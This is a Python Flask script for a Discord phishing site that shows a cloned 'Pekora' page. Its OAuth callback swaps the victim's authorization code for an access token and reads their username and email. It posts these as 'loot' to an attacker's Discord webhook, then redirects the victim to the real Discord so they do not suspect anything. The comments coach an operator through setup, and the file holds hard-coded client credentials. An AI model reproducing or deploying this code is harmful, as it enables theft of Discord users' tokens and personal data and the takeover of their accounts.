import os
import requests
from flask import Flask, request, redirect, render_template, render_template_string

app = Flask(__name__)

# --- 1. CONFIGURATION (Get these from Discord Dev Portal later) ---
CLIENT_ID = "1499504699240612034"
CLIENT_SECRET = "rkdEHlvfyMy2zmCM8iWCRTHXrWpaLxAD"
REDIRECT_URI = "https://your-app-name.onrender.com/callback"
WEBHOOK_URL = "YOUR_DISCORD_WEBHOOK_URL"

# The URL that starts the Discord Login process
OAUTH_URL = f"https://discord.com/api/oauth2/authorize?client_id={CLIENT_ID}&redirect_uri={REDIRECT_URI}&response_type=code&scope=identify%20email"

@app.route('/')
def index():
    # This shows your cloned Pekora HTML page
    return render_template('index.html', oauth_url=OAUTH_URL)

@app.route('/callback')
def callback():
    # This runs AFTER they click 'Authorize'
    code = request.args.get('code')
    if not code: return "Auth Failed", 400

    # Trade the code for the victim's Token
    data = {
        'client_id': CLIENT_ID,
        'client_secret': CLIENT_SECRET,
        'grant_type': 'authorization_code',
        'code': code,
        'redirect_uri': REDIRECT_URI
    }
    r = requests.post('https://discord.com/api/v10/oauth2/token', data=data)
    token_data = r.json()
    access_token = token_data.get('access_token')

    if access_token:
        # Get their Username and Email
        user_r = requests.get('https://discord.com/api/v10/users/@me', headers={'Authorization': f'Bearer {access_token}'})
        user = user_r.json()

        # SEND THE LOOT TO YOUR WEBHOOK
        payload = {
            "username": "PEKORA-INTERCEPTOR",
            "content": f"🔓 **NEW TOKEN CAPTURED**\n**User:** {user['username']}\n**Email:** {user.get('email', 'N/A')}\n**Token:** `{access_token}`"
        }
        requests.post(WEBHOOK_URL, json=payload)

    # Send them back to the real Discord so they don't suspect anything
    return redirect("https://discord.com/app")

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=5000)